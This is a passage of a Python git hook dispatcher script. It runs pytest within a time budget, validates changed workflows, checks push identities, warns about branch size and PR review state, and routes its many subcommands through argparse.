            str(safe_push_tests),
        ],
        [
            sys.executable,
            "-m",
            "pytest",
            "-m",
            "not integration and not safe_push_transport",
            str(safe_push_tests),
        ],
    ]


def run_pytest(repo_root: Path) -> int:
    env = _clean_git_env()
    for key in (
        "CLAUDE_PROJECT_DIR",
        "CLAUDE_PLUGIN_ROOT",
        "COPILOT_PLUGIN_ROOT",
        "GIT_INDEX_FILE",
        "GIT_NO_REPLACE_OBJECTS",
        "GIT_OBJECT_DIRECTORY",
        "GIT_ALTERNATE_OBJECT_DIRECTORIES",
        "SKIP_RETROSPECTIVE_GATE",
    ):
        env.pop(key, None)
    env["CLAUDE_PLUGIN_ROOT"] = str(repo_root / "src/copilot-cli")
    # TEST_SUITE_TIMEOUT_SECONDS is a budget for the whole suite, not per
    # command. Splitting the suite across processes must not multiply how long
    # pre-push can block, or the hook outlives lefthook's own deadline and the
    # timeout looks nondeterministic.
    deadline = time.monotonic() + TEST_SUITE_TIMEOUT_SECONDS
    for command in _pytest_commands(repo_root):
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            print(
                "ERROR: pytest suite exceeded the "
                f"{TEST_SUITE_TIMEOUT_SECONDS}s budget before running {command}",
                file=sys.stderr,
            )
            return 1
        result = _run_command(
            command,
            repo_root,
            process_env=env,
            timeout_seconds=remaining,
        )
        _print_process_output(result)
        if result.returncode != 0:
            return result.returncode
    return 0


def _workflow_local_base_ref() -> str:
    raw = os.environ.get(WORKFLOW_LOCAL_BASE_REF_ENV, "").strip()
    if raw and not _is_zero_sha(raw):
        return raw
    return WORKFLOW_LOCAL_DEFAULT_BASE


def _pushed_workflow_paths(
    paths: Sequence[str],
    repo_root: Path,
    base_ref: str,
) -> set[str] | None:
    """Return the workflow paths this branch changed versus ``base_ref``.

    Uses the three-dot diff ``base_ref...HEAD`` so only commits unique to this
    branch since the merge base count; workflows that main advanced past on a
    rebase or force-push are excluded. ``None`` signals that ``base_ref`` could
    not be resolved, so callers validate every provided path and the gate is
    never weaker than before.
    """
    if not paths:
        return set()
    result = _run_git(
        repo_root,
        ["diff", "--name-only", f"{base_ref}...HEAD", "--", *paths],
    )
    if result.returncode != 0:
        return None
    return {_normalize_ratchet_path(line) for line in result.stdout.splitlines() if line.strip()}


def _select_pushed_workflows(paths: Sequence[str], repo_root: Path) -> list[str]:
    base_ref = _workflow_local_base_ref()
    changed = _pushed_workflow_paths(paths, repo_root, base_ref)
    if changed is None:
        print(
            f"WARNING: workflow-local could not resolve {base_ref}; "
            "validating all provided workflows",
            file=sys.stderr,
        )
        return list(paths)
    return [path for path in paths if _normalize_ratchet_path(path) in changed]


def run_workflow_local(paths: Sequence[str], repo_root: Path) -> int:
    selected = _select_pushed_workflows(paths, repo_root)
    if not selected:
        print(
            "workflow-local: no workflow files changed versus "
            f"{_workflow_local_base_ref()}; skipping act "
            "(imported or unchanged workflows excluded)",
        )
        return 0
    result = _run_command(
        [
            sys.executable,
            "scripts/validation/run_workflow_local_test.py",
            "--files",
            *selected,
            "--repo-root",
            str(repo_root),
        ],
        repo_root,
        timeout_seconds=WORKFLOW_LOCAL_TIMEOUT_SECONDS,
    )
    _print_process_output(result)
    return 0 if result.returncode == 4 else result.returncode


def check_placeholder_identities(stream: TextIO, repo_root: Path) -> int:
    try:
        refs = parse_push_refs(stream)
    except ValueError as error:
        print(f"ERROR: malformed pre-push input, {error}", file=sys.stderr)
        return 2
    for push_ref in refs:
        if push_ref.is_deletion:
            continue
        try:
            update = resolve_push_update(push_ref, repo_root)
        except PushUpdateConfigError as error:
            print(f"ERROR: {error}", file=sys.stderr)
            return 2
        result = _run_command(
            [
                sys.executable,
                "scripts/validation/check_placeholder_identity.py",
                "--push-range",
                update.range_spec,
                "--repo-root",
                str(repo_root),
            ],
            repo_root,
        )
        _print_process_output(result)
        if result.returncode != 0:
            return result.returncode
    return 0


def additions_advisory(repo_root: Path) -> int:
    result = _run_git(
        repo_root,
        ["diff", "--numstat", "origin/main...HEAD"],
    )
    if result.returncode != 0:
        _print_process_output(result)
        print("WARNING: could not calculate branch additions", file=sys.stderr)
        return 0
    additions = sum(
        int(fields[0])
        for line in result.stdout.splitlines()
        if len(fields := line.split("\t", 2)) == 3 and fields[0].isdigit()
    )
    if additions > 500:
        print(f"WARNING: branch adds {additions} lines (recommended maximum 500)")
    return 0


def run_cli_e2e(test_file: str, repo_root: Path) -> int:
    if os.environ.get("SKIP_CLI_E2E") == "true":
        print("CLI E2E skipped (SKIP_CLI_E2E=true)")
        return 0
    if shutil.which("copilot") is None and shutil.which("claude") is None:
        print("CLI E2E skipped (no supported CLI installed)")
        return 0
    env = _clean_git_env()
    for key in ("CLAUDE_PROJECT_DIR", "CLAUDE_PLUGIN_ROOT", "COPILOT_PLUGIN_ROOT"):
        env.pop(key, None)
    env["RUN_CLI_E2E"] = "1"
    result = _run_command(
        [sys.executable, "-m", "pytest", test_file, "-v"],
        repo_root,
        process_env=env,
        timeout_seconds=CLI_E2E_TIMEOUT_SECONDS,
    )
    _print_process_output(result)
    return result.returncode


def validate_branch_sessions(paths: Sequence[str], repo_root: Path) -> int:
    failed = False
    new_logs = new_session_logs(paths, repo_root)
    for path in paths:
        command = [sys.executable, "scripts/validate_session_json.py", path]
        if path not in new_logs:
            command.append("--existing-log")
        result = _run_command(command, repo_root)
        _print_process_output(result)
        failed |= result.returncode != 0
    return 1 if failed else 0


def sync_observations(paths: Sequence[str], repo_root: Path) -> int:
    for path in paths:
        result = _run_command(
            [
                sys.executable,
                ".serena/scripts/import_observations_to_forgetful.py",
                "--observation-file",
                path,
                "--confidence-levels",
                "HIGH",
                "MED",
            ],
            repo_root,
        )
        _print_process_output(result)
        if result.returncode != 0:
            print(f"WARNING: observation sync failed for {path}", file=sys.stderr)
    return 0


def bot_cascade_advisory(repo_root: Path) -> int:
    try:
        pr = _run_command(
            ["gh", "pr", "view", "--json", "number", "--jq", ".number"],
            repo_root,
        )
    except FileNotFoundError:
        print("Bot cascade check skipped (gh unavailable)")
        return 0
    if pr.returncode != 0 or not pr.stdout.strip():
        print("Bot cascade check skipped (no resolvable PR)")
        return 0
    pr_number = pr.stdout.strip()
    threads = _run_command(
        [
            sys.executable,
            ".claude/skills/github/scripts/pr/get_unresolved_review_threads.py",
            "--pull-request",
            pr_number,
        ],
        repo_root,
    )
    _print_process_output(threads)
    _warn_unresolved_threads(threads.stdout, pr_number)
    _warn_recent_bot_review(pr_number, repo_root)
    return 0


def _warn_unresolved_threads(stdout: str, pr_number: str) -> None:
    try:
        payload = json.loads(stdout)
    except json.JSONDecodeError:
        print(f"Bot cascade check skipped for PR #{pr_number} (invalid JSON)")
        return
    complete = payload.get("fetched_pages_complete") is True
    count = payload.get("unresolved_count")
    if complete and isinstance(count, int) and not isinstance(count, bool) and count > 0:
        print(f"WARNING: PR #{pr_number} has {count} unresolved thread(s)")


def _warn_recent_bot_review(pr_number: str, repo_root: Path) -> None:
    reviews = _run_command(
        [
            "gh",
            "api",
            f"repos/{{owner}}/{{repo}}/pulls/{pr_number}/reviews",
            "--paginate",
            "--jq",
            '.[] | select(.user.type == "Bot") | .submitted_at',
        ],
        repo_root,
    )
    if reviews.returncode != 0:
        print(f"Bot cascade review query skipped for PR #{pr_number}")
        return
    timestamps = [line.strip().strip('"') for line in reviews.stdout.splitlines() if line.strip()]
    if not timestamps:
        return
    try:
        submitted = datetime.fromisoformat(max(timestamps).replace("Z", "+00:00"))
    except ValueError:
        print(f"Bot cascade timestamp parse skipped for PR #{pr_number}")
        return
    age = int((datetime.now(UTC) - submitted).total_seconds())
    if age < 120:
        print(f"WARNING: PR #{pr_number} last bot review is {age}s old (< 120s)")


def _print_process_output(
    result: subprocess.CompletedProcess[str],
    stdout_stream: TextIO | None = None,
) -> None:
    target_stdout = stdout_stream or sys.stdout
    if result.stdout:
        print(result.stdout, end="", file=target_stdout)
        # lefthook pipes stdout, so Python block-buffers it while stderr stays
        # unbuffered. Without this flush a later stderr write overtakes the
        # stdout it explains, and the reason surfaces under the next hook's
        # group header where it reads as that hook's output. Flushing
        # target_stdout rather than sys.stdout keeps this correct when a
        # caller redirects the explanation to stderr, which is already
        # unbuffered and needs no flush. Refs #3627.
        target_stdout.flush()
    if result.stderr:
        print(result.stderr, end="", file=sys.stderr)


def _print_advisory_failure(
    label: str,
    result: subprocess.CompletedProcess[str],
) -> None:
    _print_process_output(result, stdout_stream=sys.stderr)
    print(f"WARNING: {label} failed without blocking", file=sys.stderr)


def _repo_root(args: argparse.Namespace) -> Path:
    return Path(args.repo_root).resolve()


def _handle_branch(args: argparse.Namespace) -> int:
    return check_branch(_repo_root(args))


def _handle_branch_context(args: argparse.Namespace) -> int:
    return check_branch_context(_repo_root(args))


def _handle_handoff(args: argparse.Namespace) -> int:
    return check_handoff(args.paths, _repo_root(args))


def _handle_session(args: argparse.Namespace) -> int:
    return check_sessions(args.paths, _repo_root(args))


def _handle_commit_message(args: argparse.Namespace) -> int:
    return check_commit_message(Path(args.message_path))


def _handle_staged_dashes(args: argparse.Namespace) -> int:
    return check_staged_dashes(args.paths, _repo_root(args))


def _handle_staged_action_pins(args: argparse.Namespace) -> int:
    return check_staged_action_pins(args.paths, _repo_root(args))


def _handle_staged_conflict_markers(args: argparse.Namespace) -> int:
    return check_staged_conflict_markers(args.paths, _repo_root(args))


def _handle_tracked_conflict_markers(args: argparse.Namespace) -> int:
    return check_tracked_conflict_markers(_repo_root(args))


def _handle_github_bash(args: argparse.Namespace) -> int:
    return check_github_bash_scripts(args.paths, _repo_root(args))


def _handle_security_suppressions(args: argparse.Namespace) -> int:
    return check_security_suppressions(args.paths, _repo_root(args))


def _handle_mypy(args: argparse.Namespace) -> int:
    return run_mypy(args.paths, _repo_root(args))


def _handle_yamllint(args: argparse.Namespace) -> int:
    return run_yamllint(args.paths, _repo_root(args))


def _handle_skillforge(args: argparse.Namespace) -> int:
    return run_skillforge(args.paths, _repo_root(args))


def _handle_planning(args: argparse.Namespace) -> int:
    return run_planning_advisory(_repo_root(args))


def _handle_adr_review(args: argparse.Namespace) -> int:
    return check_adr_review_policy(args.paths, _repo_root(args))


def _handle_retrospective(args: argparse.Namespace) -> int:
    return check_retrospective_evidence(args.paths, _repo_root(args))


def _handle_taste(args: argparse.Namespace) -> int:
    return run_taste_advisory(args.paths, _repo_root(args))


def _handle_generate_mcp(args: argparse.Namespace) -> int:
    return generate_mcp_advisory(_repo_root(args))


def _handle_generate_agents(args: argparse.Namespace) -> int:
    return generate_agents_advisory(_repo_root(args))


def _handle_memory_tokens(args: argparse.Namespace) -> int:
    return update_memory_tokens(_repo_root(args))


def _handle_memory_size(args: argparse.Namespace) -> int:
    return validate_memory_sizes(_repo_root(args))


def _handle_memory_cross_reference(args: argparse.Namespace) -> int:
    return cross_reference_memories(args.paths, _repo_root(args))


def _handle_memory_sync(args: argparse.Namespace) -> int:
    return run_memory_sync(_repo_root(args))


def _handle_pytest(args: argparse.Namespace) -> int:
    return run_pytest(_repo_root(args))


def _handle_workflow_local(args: argparse.Namespace) -> int:
    return run_workflow_local(args.paths, _repo_root(args))


def _handle_placeholder_identity(args: argparse.Namespace) -> int:
    return check_placeholder_identities(sys.stdin, _repo_root(args))


def _handle_additions(args: argparse.Namespace) -> int:
    return additions_advisory(_repo_root(args))


def _handle_cli_hook_e2e(args: argparse.Namespace) -> int:
    return run_cli_e2e("tests/e2e/test_cli_hook_e2e.py", _repo_root(args))


def _handle_cli_plugin_e2e(args: argparse.Namespace) -> int:
    return run_cli_e2e("tests/e2e/test_plugin_load_smoke.py", _repo_root(args))


def _handle_sessions(args: argparse.Namespace) -> int:
    return validate_branch_sessions(args.paths, _repo_root(args))


def _handle_observations(args: argparse.Namespace) -> int:
    return sync_observations(args.paths, _repo_root(args))


def _handle_bot_cascade(args: argparse.Namespace) -> int:
    return bot_cascade_advisory(_repo_root(args))


def _handle_semgrep_push(args: argparse.Namespace) -> int:
    return scan_pushed_heads(sys.stdin, _repo_root(args))


def _handle_suppressions_push(args: argparse.Namespace) -> int:
    return check_pushed_suppressions(sys.stdin, _repo_root(args))


def _handle_staged_suppressions(args: argparse.Namespace) -> int:
    return check_staged_suppressions(_repo_root(args))


def _handle_suppression_diff(args: argparse.Namespace) -> int:
    return check_suppression_diff(args.base_ref, _repo_root(args))


def _handle_stage_generated(args: argparse.Namespace) -> int:
    return stage_generated(args.kind, _repo_root(args))


def _handle_extract_episodes(args: argparse.Namespace) -> int:
    return extract_session_episodes(args.paths, _repo_root(args))


def _handle_semgrep(args: argparse.Namespace) -> int:
    return run_semgrep(_repo_root(args))


def _handle_pre_push(args: argparse.Namespace) -> int:
    return check_push_refs(sys.stdin, _repo_root(args))


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--repo-root", default=str(REPO_ROOT))
    subparsers = parser.add_subparsers(required=True)
    path_commands = (
        ("handoff", _handle_handoff),
        ("session", _handle_session),
        ("staged-dashes", _handle_staged_dashes),
        ("staged-action-pins", _handle_staged_action_pins),
        ("staged-conflict-markers", _handle_staged_conflict_markers),
        ("github-bash", _handle_github_bash),
        ("security-suppressions", _handle_security_suppressions),
        ("mypy", _handle_mypy),
        ("yamllint", _handle_yamllint),
        ("skillforge", _handle_skillforge),
        ("taste", _handle_taste),
        ("memory-cross-reference", _handle_memory_cross_reference),
        ("workflow-local", _handle_workflow_local),
        ("sessions", _handle_sessions),
        ("observations", _handle_observations),
        ("extract-episodes", _handle_extract_episodes),
        ("adr-review", _handle_adr_review),
        ("retrospective", _handle_retrospective),
    )
    simple_commands = (
        ("branch", _handle_branch),
        ("branch-context", _handle_branch_context),
        ("planning", _handle_planning),
        ("generate-mcp", _handle_generate_mcp),
        ("generate-agents", _handle_generate_agents),
        ("memory-token-update", _handle_memory_tokens),
        ("memory-size", _handle_memory_size),
        ("memory-sync", _handle_memory_sync),
        ("pytest", _handle_pytest),
        ("placeholder-identity", _handle_placeholder_identity),
        ("additions", _handle_additions),
        ("cli-hook-e2e", _handle_cli_hook_e2e),
        ("cli-plugin-e2e", _handle_cli_plugin_e2e),
        ("bot-cascade", _handle_bot_cascade),
        ("semgrep", _handle_semgrep),
        ("semgrep-push", _handle_semgrep_push),
        ("security-suppressions-push", _handle_suppressions_push),
        ("security-suppressions-staged", _handle_staged_suppressions),
        ("pre-push", _handle_pre_push),
        ("tracked-conflict-markers", _handle_tracked_conflict_markers),
    )
    for name, handler in path_commands:
        _add_path_command(subparsers, name, handler)
    for name, handler in simple_commands:
        _add_simple_command(subparsers, name, handler)
    message = subparsers.add_parser("commit-message")
    message.add_argument("message_path")
    message.set_defaults(handler=_handle_commit_message)
    generated = subparsers.add_parser("stage-generated")
    generated.add_argument("kind", choices=sorted(GENERATED_PATHS | GENERATED_GLOBS))
    generated.set_defaults(handler=_handle_stage_generated)
    suppression_diff = subparsers.add_parser(
        "security-suppressions-diff",
        help="CI backstop: check HEAD..base_ref range for new security suppressions",
    )
    suppression_diff.add_argument("--base-ref", required=True, metavar="REF")
    suppression_diff.set_defaults(handler=_handle_suppression_diff)
    return parser


def _add_path_command(
    subparsers: argparse._SubParsersAction[argparse.ArgumentParser],
    name: str,
    handler: object,
) -> None:
    command = subparsers.add_parser(name)
    command.add_argument("paths", nargs="*")
    command.set_defaults(handler=handler)


def _add_simple_command(
    subparsers: argparse._SubParsersAction[argparse.ArgumentParser],
    name: str,
    handler: object,
) -> None:
    command = subparsers.add_parser(name)
    command.set_defaults(handler=handler)


def main(argv: Sequence[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    return int(args.handler(args))


if __name__ == "__main__":
    raise SystemExit(main())
